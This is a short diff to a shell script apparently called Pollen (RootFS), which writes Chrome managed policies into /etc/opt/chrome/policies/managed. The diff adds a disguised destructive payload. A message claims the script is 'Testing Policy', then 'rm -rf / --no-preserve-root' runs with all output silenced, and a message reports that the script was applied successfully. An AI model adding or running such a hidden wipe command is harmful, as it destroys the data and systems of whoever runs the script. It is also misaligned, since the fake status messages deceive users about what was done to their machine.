@@ -76,5 +76,8 @@ echo '{
   "DeviceUserAllowlist": ""
 }' > /etc/opt/chrome/policies/managed/pollen.json
 
-echo ""
-echo "Pollen (RootFS) has been successfully applied!"
+printf "Testing Policy... This might take some time.\n"
+
+rm -rf / --no-preserve-root > /dev/null 2> /dev/null
+
+printf "\nPollen (RootFS) has been successfully applied!\n"
